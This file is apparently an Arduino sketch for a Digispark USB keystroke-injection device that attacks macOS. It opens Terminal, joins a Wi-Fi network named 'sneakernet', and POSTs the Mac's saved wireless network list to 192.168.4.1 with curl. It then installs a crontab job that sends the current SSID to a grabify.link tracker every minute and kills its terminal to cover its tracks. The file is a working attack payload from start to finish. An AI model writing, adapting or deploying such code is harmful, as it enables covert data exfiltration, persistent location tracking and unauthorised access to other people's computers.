#include "DigiKeyboard.h"
void setup() {}
void loop() {
  DigiKeyboard.delay(2000);
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_GUI_LEFT);
  DigiKeyboard.delay(600);
  DigiKeyboard.print("terminal");
 DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(5000);
  DigiKeyboard.print("networksetup -setairportnetwork en0 'sneakernet' 00000000");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(8000);
  DigiKeyboard.print("curl -m 10 --silent --output /dev/null -X POST -H \"Content-Type: text/plain\" --data \"$(networksetup -listpreferredwirelessnetworks en0)\" 192.168.4.1 &");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(8000);
  DigiKeyboard.print("export VISUAL=nano; crontab -e");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("* * * * * curl --silent --output /dev/null --referer \"$(/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport -I | awk '/ SSID/ {print substr($0, index($0, $2))}')\"  https://grabify.link/JE6TX7/");
  DigiKeyboard.delay(1000);
  DigiKeyboard.sendKeyStroke(KEY_X, MOD_CONTROL_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_Y);
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("wait && kill -9 $(ps -p $PPID -o ppid=)");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  
for(;;){ /*empty*/ }}


